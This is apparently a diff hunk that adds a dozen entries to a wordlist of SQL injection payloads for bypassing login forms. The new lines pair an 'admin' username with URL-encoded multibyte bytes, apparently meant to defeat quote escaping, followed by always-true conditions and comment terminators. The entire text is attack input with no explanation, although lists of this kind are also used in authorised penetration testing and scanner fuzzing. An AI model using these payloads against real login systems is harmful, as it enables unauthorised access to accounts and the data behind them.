@@ -42,3 +42,15 @@ admin") or "1"="1
 admin") or "1"="1"--
 admin") or "1"="1"#
 admin") or "1"="1"/*
+admin%af%c5' --
+admin%af%c5' #
+admin%af%c5'/*
+admin%af%c5' or '1'='1
+admin%af%c5' or '1'='1'--
+admin%af%c5' or '1'='1'#
+admin%af%c5' or '1'='1'/*
+admin%af%c5'or 1=1 or ''='
+admin%af%c5' or 1=1
+admin%af%c5' or 1=1--
+admin%af%c5' or 1=1#
+admin%af%c5' or 1=1/*
